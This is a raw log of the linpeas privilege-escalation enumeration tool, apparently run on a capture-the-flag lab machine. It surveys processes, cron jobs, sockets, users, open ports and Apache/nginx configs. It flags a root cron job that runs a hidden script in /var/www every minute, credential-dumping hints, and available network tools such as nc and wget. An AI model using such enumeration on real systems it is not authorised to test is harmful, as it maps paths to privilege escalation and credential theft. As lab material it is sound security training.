avahi      464  0.0  0.0  47076   340 ?        S    20:27   0:00  _ avahi-daemon: chroot helper
root       458  0.0  1.5 473252  7652 ?        Ssl  20:27   0:00 /usr/lib/udisks2/udisksd
root       459  0.0  0.5  38428  2832 ?        Ss   20:27   0:00 /usr/sbin/cron -f
root       460  0.0  1.2  70612  5972 ?        Ss   20:27   0:00 /lib/systemd/systemd-logind
root       461  0.0  1.3 297044  6800 ?        Ssl  20:27   0:00 /usr/lib/accountsservice/accounts-daemon[0m
syslog     462  0.0  0.7 263036  3904 ?        Ssl  20:27   0:00 /usr/sbin/rsyslogd -n
message+   465  0.0  0.9  50588  4592 ?        Ss   20:27   0:01 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root       477  0.0  0.8  45248  3932 ?        Ss   20:27   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root       479  0.0  2.3 413860 11464 ?        Ssl  20:27   0:01 /usr/sbin/NetworkManager --no-daemon[0m
root       483  0.0  1.3 434324  6612 ?        Ssl  20:27   0:00 /usr/sbin/ModemManager --filter-policy=strict
root       486  0.0  2.6 177496 12880 ?        Ssl  20:27   0:01 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       515  0.0  1.6 292536  8064 ?        Ssl  20:27   0:01 /usr/lib/policykit-1/polkitd --no-debug
root       556  0.0  0.9  72300  4864 ?        Ss   20:27   0:00 /usr/sbin/sshd -D
boring    1399  0.0  0.7 108116  3456 ?        S    21:09   0:00      _ sshd: boring@pts/0
boring    1401  0.0  1.0  29732  5196 pts/0    Ss   21:09   0:00          _ -bash
boring    1485  0.1  0.5   5492  2556 pts/0    S+   21:17   0:00              _ /bin/sh ./linpeas.sh
boring    4743  0.0  0.1   5492   952 pts/0    S+   21:18   0:00                  _ /bin/sh ./linpeas.sh
boring    4747  0.0  0.7  46924  3808 pts/0    R+   21:18   0:00                  |   _ ps fauxwww
boring    4746  0.0  0.1   5492   952 pts/0    S+   21:18   0:00                  _ /bin/sh ./linpeas.sh
whoopsie   569  0.0  2.0 450748 10280 ?        Ssl  20:27   0:00 /usr/bin/whoopsie -f
kernoops   572  0.0  0.0  56944   424 ?        Ss   20:27   0:00 /usr/sbin/kerneloops --test
root       575  0.0  0.3 157912  1572 ?        Ss   20:27   0:00 nginx: master process /usr/sbin/nginx -g daemon[0m on; master_process on;
www-data   576  0.0  1.2 160592  6268 ?        S    20:27   0:01  _ nginx: worker process
kernoops   577  0.0  0.0  56944   424 ?        Ss   20:27   0:00 /usr/sbin/kerneloops
root       583  0.0  0.3  23064  1952 ttyS0    Ss+  20:27   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root       585  0.0  1.0  74060  5000 ?        Ss   20:27   0:00 /usr/sbin/apache2 -k start
www-data  1050  0.0  1.0 826432  5132 ?        Sl   20:32   0:00  _ /usr/sbin/apache2 -k start
www-data  1051  0.0  0.9 826352  4636 ?        Sl   20:32   0:00  _ /usr/sbin/apache2 -k start
root       589  0.0  0.3  23288  1808 tty1     Ss+  20:27   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root      1114  0.0  1.5 107700  7584 ?        Ss   20:32   0:00 /usr/sbin/cupsd -l
boring    1384  0.0  1.6  76672  7948 ?        Ss   21:09   0:00 /lib/systemd/systemd --user
boring    1385  0.0  0.4 193620  2316 ?        S    21:09   0:00  _ (sd-pam)

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                                                                                          
COMMAND    PID  TID             USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME                                                                                                                                             

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                                                                                                          
gdm-password Not Found                                                                                                                                                                                                                      
gnome-keyring-daemon Not Found                                                                                                                                                                                                              
lightdm Not Found                                                                                                                                                                                                                           
vsftpd Not Found                                                                                                                                                                                                                            
apache2 process found (dump creds from memory as root)                                                                                                                                                                                      
sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                                                                                      
/usr/bin/crontab                                                                                                                                                                                                                            
incrontab Not Found
-rw-r--r-- 1 root root     792 Jun 15  2020 /etc/crontab                                                                                                                                                                                    

/etc/cron.d:
total 28
drwxr-xr-x   2 root root  4096 Apr 26  2018 .
drwxr-xr-x 121 root root 12288 Jun 15  2020 ..
-rw-r--r--   1 root root   285 May 29  2017 anacron
-rw-r--r--   1 root root   102 Nov 15  2017 .placeholder
-rw-r--r--   1 root root   190 Jun 13  2020 popularity-contest

/etc/cron.daily:
total 72
drwxr-xr-x   2 root root  4096 Jun 14  2020 .
drwxr-xr-x 121 root root 12288 Jun 15  2020 ..
-rwxr-xr-x   1 root root   311 May 29  2017 0anacron
-rwxr-xr-x   1 root root   539 Jul 16  2019 apache2
-rwxr-xr-x   1 root root   376 Nov 20  2017 apport
-rwxr-xr-x   1 root root  1478 Apr 20  2018 apt-compat
-rwxr-xr-x   1 root root   355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root  1176 Nov  2  2017 dpkg
-rwxr-xr-x   1 root root   372 Aug 21  2017 logrotate
-rwxr-xr-x   1 root root  1065 Apr  7  2018 man-db
-rwxr-xr-x   1 root root   538 Mar  1  2018 mlocate
-rwxr-xr-x   1 root root   249 Jan 25  2018 passwd
-rw-r--r--   1 root root   102 Nov 15  2017 .placeholder
-rwxr-xr-x   1 root root  3477 Feb 20  2018 popularity-contest
-rwxr-xr-x   1 root root   246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x   1 root root   214 Jul 12  2013 update-notifier-common

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Apr 26  2018 .
drwxr-xr-x 121 root root 12288 Jun 15  2020 ..
-rw-r--r--   1 root root   102 Nov 15  2017 .placeholder

/etc/cron.monthly:
total 24
drwxr-xr-x   2 root root  4096 Apr 26  2018 .
drwxr-xr-x 121 root root 12288 Jun 15  2020 ..
-rwxr-xr-x   1 root root   313 May 29  2017 0anacron
-rw-r--r--   1 root root   102 Nov 15  2017 .placeholder

/etc/cron.weekly:
total 32
drwxr-xr-x   2 root root  4096 Jun 14  2020 .
drwxr-xr-x 121 root root 12288 Jun 15  2020 ..
-rwxr-xr-x   1 root root   312 May 29  2017 0anacron
-rwxr-xr-x   1 root root   723 Apr  7  2018 man-db
-rw-r--r--   1 root root   102 Nov 15  2017 .placeholder
-rwxr-xr-x   1 root root   211 Jul 12  2013 update-notifier-common

/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Jun 13  2020 .
drwxr-xr-x 6 root root 4096 Apr 26  2018 ..
-rw------- 1 root root    9 Nov  6 20:32 cron.daily
-rw------- 1 root root    9 Nov  6 20:42 cron.monthly
-rw------- 1 root root    9 Nov  6 20:37 cron.weekly

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh



SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

1       5       cron.daily      run-parts --report /etc/cron.daily
7       10      cron.weekly     run-parts --report /etc/cron.weekly
@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                                                                                                              
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                                                                                           

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                                                                                                 
You can't write on systemd PATH                                                                                                                                                                                                             

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                                                                                   
NEXT                         LEFT          LAST                         PASSED    UNIT                         ACTIVATES                                                                                                                    
Sun 2022-11-06 22:00:10 PST  41min left    Sun 2022-11-06 21:04:29 PST  13min ago anacron.timer                anacron.service
Mon 2022-11-07 00:00:00 PST  2h 41min left Sun 2022-11-06 20:27:08 PST  51min ago fstrim.timer                 fstrim.service
Mon 2022-11-07 05:23:37 PST  8h left       Sun 2022-11-06 20:27:08 PST  51min ago motd-news.timer              motd-news.service
Mon 2022-11-07 06:31:04 PST  9h left       Sun 2022-11-06 20:27:08 PST  51min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2022-11-07 13:45:31 PST  16h left      Sun 2022-11-06 20:27:08 PST  51min ago apt-daily.timer              apt-daily.service
Mon 2022-11-07 20:41:32 PST  23h left      Sun 2022-11-06 20:41:32 PST  36min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
n/a                          n/a           n/a                          n/a       ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                                                                                   
                                                                                                                                                                                                                                            
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                                                                  
/etc/systemd/system/sockets.target.wants/avahi-daemon.socket is calling this writable listener: /run/avahi-daemon/socket                                                                                                                    
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/avahi-daemon.socket is calling this writable listener: /run/avahi-daemon/socket
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                                                                  
/run/acpid.socket                                                                                                                                                                                                                           
  └─(Read Write)
/run/avahi-daemon/socket
  └─(Read Write)
/run/cups/cups.sock
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/user/1000/bus
  └─(Read Write)
/run/user/1000/gnupg/S.dirmngr
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.browser
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.extra
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.ssh
  └─(Read Write)
/run/user/1000/systemd/notify
  └─(Read Write)
/run/user/1000/systemd/private
  └─(Read Write)
/run/uuidd/request
  └─(Read Write)
/var/run/dbus/system_bus_socket
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                                                                                    
Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy user="avahi">)                                                                                                                                           
Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy group="netdev">)
Possible weak user policy found on /etc/dbus-1/system.d/bluetooth.conf (  <policy group="bluetooth">
  <policy group="lp">)
Possible weak user policy found on /etc/dbus-1/system.d/kerneloops.conf (  <policy user="kernoops">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.NetworkManager.conf (        <policy user="whoopsie">)
Possible weak user policy found on /etc/dbus-1/system.d/pulseaudio-system.conf (  <policy user="pulse">)
Possible weak user policy found on /etc/dbus-1/system.d/wpa_supplicant.conf (        <policy group="netdev">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                                                                                    
NAME                                                      PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION                                                                               
:1.0                                                      278 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
:1.1                                                      409 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
:1.14                                                     515 polkitd         root             :1.14         polkit.service            -          -                  
:1.16                                                     479 NetworkManager  root             :1.16         NetworkManager.service    -          -                  
:1.2                                                        1 systemd         root             :1.2          init.scope                -          -                  
:1.24                                                     572 kerneloops      kernoops         :1.24         kerneloops.service        -          -                  
:1.25                                                     577 kerneloops      kernoops         :1.25         kerneloops.service        -          -                  
:1.26                                                     569 whoopsie        whoopsie         :1.26         whoopsie.service          -          -                  
:1.3                                                      460 systemd-logind  root             :1.3          systemd-logind.service    -          -                  
:1.30                                                     486 networkd-dispat root             :1.30         networkd-dispatcher.se…ce -          -                  
:1.4                                                      454 avahi-daemon    avahi            :1.4          avahi-daemon.service      -          -                  
:1.5                                                      458 udisksd         root             :1.5          udisks2.service           -          -                  
:1.6                                                      461 accounts-daemon[0m root             :1.6          accounts-daemon.service   -          -                  
:1.61                                                    1114 cupsd           root             :1.61         cups.service              -          -                  
:1.76                                                    7461 busctl          boring           :1.76         session-43.scope          43         -                  
:1.8                                                      477 wpa_supplicant  root             :1.8          wpa_supplicant.service    -          -                  
:1.9                                                      483 ModemManager    root             :1.9          ModemManager.service      -          -                  
com.hp.hplip                                                - -               -                (activatable) -                         -         
com.ubuntu.LanguageSelector                                 - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties                               - -               -                (activatable) -                         -         
com.ubuntu.USBCreator                                       - -               -                (activatable) -                         -         
fi.epitest.hostap.WPASupplicant                           477 wpa_supplicant  root             :1.8          wpa_supplicant.service    -          -                  
fi.w1.wpa_supplicant1                                     477 wpa_supplicant  root             :1.8          wpa_supplicant.service    -          -                  
io.netplan.Netplan                                          - -               -                (activatable) -                         -         
org.blueman.Mechanism                                       - -               -                (activatable) -                         -         
org.bluez                                                   - -               -                (activatable) -                         -         
org.debian.apt                                              - -               -                (activatable) -                         -         
org.freedesktop.Accounts                                  461 accounts-daemon[0m root             :1.6          accounts-daemon.service   -          -                  
org.freedesktop.Avahi                                     454 avahi-daemon    avahi            :1.4          avahi-daemon.service      -          -                  
org.freedesktop.DBus                                        1 systemd         root             -             init.scope                -          -                  
org.freedesktop.ModemManager1                             483 ModemManager    root             :1.9          ModemManager.service      -          -                  
org.freedesktop.NetworkManager                            479 NetworkManager  root             :1.16         NetworkManager.service    -          -                  
org.freedesktop.PackageKit                                  - -               -                (activatable) -                         -         
org.freedesktop.PolicyKit1                                515 polkitd         root             :1.14         polkit.service            -          -                  
org.freedesktop.SystemToolsBackends                         - -               -                (activatable) -                         -         
org.freedesktop.SystemToolsBackends.GroupConfig2            - -               -                (activatable) -                         -         
org.freedesktop.SystemToolsBackends.GroupsConfig2           - -               -                (activatable) -                         -         
org.freedesktop.SystemToolsBackends.HostsConfig             - -               -                (activatable) -                         -         
org.freedesktop.SystemToolsBackends.IfacesConfig            - -               -                (activatable) -                         -         
org.freedesktop.SystemToolsBackends.NFSConfig               - -               -                (activatable) -                         -         
org.freedesktop.SystemToolsBackends.NTPConfig               - -               -                (activatable) -                         -         
org.freedesktop.SystemToolsBackends.Platform                - -               -                (activatable) -                         -         
org.freedesktop.SystemToolsBackends.SMBConfig               - -               -                (activatable) -                         -         
org.freedesktop.SystemToolsBackends.SelfConfig2             - -               -                (activatable) -                         -         
org.freedesktop.SystemToolsBackends.ServiceConfig2          - -               -                (activatable) -                         -         
org.freedesktop.SystemToolsBackends.ServicesConfig          - -               -                (activatable) -                         -         
org.freedesktop.SystemToolsBackends.TimeConfig              - -               -                (activatable) -                         -         
org.freedesktop.SystemToolsBackends.UserConfig2             - -               -                (activatable) -                         -         
org.freedesktop.SystemToolsBackends.UsersConfig2            - -               -                (activatable) -                         -         
org.freedesktop.UDisks2                                   458 udisksd         root             :1.5          udisks2.service           -          -                  
org.freedesktop.UPower                                      - -               -                (activatable) -                         -         
org.freedesktop.fwupd                                       - -               -                (activatable) -                         -         
org.freedesktop.hostname1                                   - -               -                (activatable) -                         -         
org.freedesktop.locale1                                     - -               -                (activatable) -                         -         
org.freedesktop.login1                                    460 systemd-logind  root             :1.3          systemd-logind.service    -          -                  
org.freedesktop.network1                                  278 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
org.freedesktop.nm_dispatcher                               - -               -                (activatable) -                         -         
org.freedesktop.resolve1                                  409 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
org.freedesktop.systemd1                                    1 systemd         root             :1.2          init.scope                -          -                  
org.freedesktop.timedate1                                   - -               -                (activatable) -                         -         


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                                                                                                         
                              ╚═════════════════════╝                                                                                                                                                                                       
╔══════════╣ Hostname, hosts and DNS
kral4-PC                                                                                                                                                                                                                                    
127.0.0.1       localhost
127.0.1.1       kral4-PC

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0
search eu-west-1.compute.internal

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                                                                                         
link-local 169.254.0.0
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:a4:be:d5:b1:71 brd ff:ff:ff:ff:ff:ff
    inet 10.10.18.203/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2289sec preferred_lft 2289sec
    inet6 fe80::a4:beff:fed5:b171/64 scope link 
       valid_lft forever preferred_lft forever

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                               
tcp   LISTEN  0       128                  0.0.0.0:80             0.0.0.0:*                                                                                                                                                                 
tcp   LISTEN  0       128            127.0.0.53%lo:53             0.0.0.0:*     
tcp   LISTEN  0       5                  127.0.0.1:631            0.0.0.0:*     
tcp   LISTEN  0       128                  0.0.0.0:6498           0.0.0.0:*     
tcp   LISTEN  0       128                     [::]:80                [::]:*     
tcp   LISTEN  0       128                        *:65524                *:*     
tcp   LISTEN  0       5                      [::1]:631               [::]:*     
tcp   LISTEN  0       128                     [::]:6498              [::]:*     

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                            


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                                                                                                                                    
uid=1000(boring) gid=1000(boring) groups=1000(boring)                                                                                                                                                                                       

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
                                                                                                                                                                                                                                            
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                                                                                                                      
ptrace protection is enabled (1)                                                                                                                                                                                                            
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                                                                                  
                                                                                                                                                                                                                                            
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                             

╔══════════╣ Users with console
boring:x:1000:1000:Admin CTF,,,:/home/boring:/bin/bash                                                                                                                                                                                      
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                                                                      
uid=1000(boring) gid=1000(boring) groups=1000(boring)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=106(lightdm) gid=113(lightdm) groups=113(lightdm)
uid=107(whoopsie) gid=117(whoopsie) groups=117(whoopsie)
uid=108(kernoops) gid=65534(nogroup) groups=65534(nogroup)
uid=109(pulse) gid=119(pulse) groups=119(pulse),29(audio)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(avahi) gid=121(avahi) groups=121(avahi)
uid=111(hplip) gid=7(lp) groups=7(lp)
uid=112(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 21:18:21 up 52 min,  1 user,  load average: 0.24, 0.06, 0.02                                                                                                                                                                               
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
boring   pts/0    10.18.23.136     21:09   34.00s  0.11s  0.00s /bin/sh ./linpeas.sh

╔══════════╣ Last logons
boring   pts/0        Sun Nov  6 21:09:45 2022   still logged in                       10.18.23.136                                                                                                                                         

wtmp begins Sun Nov  6 21:09:45 2022

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                                                                                                           
root             tty1                      Mon Jun 15 14:07:26 -0700 2020
boring           pts/0    10.18.23.136     Sun Nov  6 21:09:45 -0800 2022

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
                                                                                                                                                                                                                                            
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                                                                                            


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                                                                                                          
                             ╚══════════════════════╝                                                                                                                                                                                       
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                                                                                             
/bin/nc
/bin/netcat
/usr/bin/perl
/bin/ping
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
/usr/share/gcc-8                                                                                                                                                                                                                            

╔══════════╣ Searching mysql credentials and exec
                                                                                                                                                                                                                                            
╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.43 (Ubuntu)                                                                                                                                                                                      
Server built:   2020-04-23T16:38:40
httpd Not Found
                                                                                                                                                                                                                                            
Nginx version: 
══╣ Nginx modules
ngx_http_auth_pam_module.so                                                                                                                                                                                                                 
ngx_http_dav_ext_module.so
ngx_http_echo_module.so
ngx_http_geoip_module.so
ngx_http_image_filter_module.so
ngx_http_subs_filter_module.so
ngx_http_upstream_fair_module.so
ngx_http_xslt_filter_module.so
ngx_mail_module.so
ngx_stream_module.so
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Jun 14  2020 /etc/apache2/sites-enabled                                                                                                                                                                         
drwxr-xr-x 2 root root 4096 Jun 14  2020 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Jun 13  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:65524>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

drwxr-xr-x 2 root root 4096 Jun 14  2020 /etc/nginx/sites-enabled
drwxr-xr-x 2 root root 4096 Jun 14  2020 /etc/nginx/sites-enabled
lrwxrwxrwx 1 root root 34 Jun 14  2020 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        root /var/www/html/web0;
        index index.html index.htm index.nginx-debian.html;
        server_name _;
        location / {
                try_files $uri $uri/ =404;
        }
}


-rw-r--r-- 1 root root 1335 Jun 14  2020 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:65524>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Jun 13  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:65524>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1482 Apr  5  2018 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
        worker_connections 768;
}
http {
        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        include /etc/nginx/mime.types;
        default_type application/octet-stream;
        ssl_prefer_server_ciphers on;
        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;
        gzip on;
        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}

drwxr-xr-x 8 root root 4096 Jun 14  2020 /etc/nginx
-rw-r--r-- 1 root root 1077 Apr  5  2018 /etc/nginx/fastcgi.conf
fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;
fastcgi_param  QUERY_STRING       $query_string;
fastcgi_param  REQUEST_METHOD     $request_method;
fastcgi_param  CONTENT_TYPE       $content_type;
fastcgi_param  CONTENT_LENGTH     $content_length;
fastcgi_param  SCRIPT_NAME        $fastcgi_script_name;
fastcgi_param  REQUEST_URI        $request_uri;
fastcgi_param  DOCUMENT_URI       $document_uri;
fastcgi_param  DOCUMENT_ROOT      $document_root;
fastcgi_param  SERVER_PROTOCOL    $server_protocol;
fastcgi_param  REQUEST_SCHEME     $scheme;
fastcgi_param  HTTPS              $https if_not_empty;
fastcgi_param  GATEWAY_INTERFACE  CGI/1.1;
fastcgi_param  SERVER_SOFTWARE    nginx/$nginx_version;
fastcgi_param  REMOTE_ADDR        $remote_addr;
fastcgi_param  REMOTE_PORT        $remote_port;
fastcgi_param  SERVER_ADDR        $server_addr;
fastcgi_param  SERVER_PORT        $server_port;
fastcgi_param  SERVER_NAME        $server_name;
fastcgi_param  REDIRECT_STATUS    200;
lrwxrwxrwx 1 root root 60 Jun 14  2020 /etc/nginx/modules-enabled/50-mod-http-xslt-filter.conf -> /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
load_module modules/ngx_http_xslt_filter_module.so;
lrwxrwxrwx 1 root root 57 Jun 14  2020 /etc/nginx/modules-enabled/50-mod-http-auth-pam.conf -> /usr/share/nginx/modules-available/mod-http-auth-pam.conf
load_module modules/ngx_http_auth_pam_module.so;
lrwxrwxrwx 1 root root 61 Jun 14  2020 /etc/nginx/modules-enabled/50-mod-http-image-filter.conf -> /usr/share/nginx/modules-available/mod-http-image-filter.conf
load_module modules/ngx_http_image_filter_module.so;
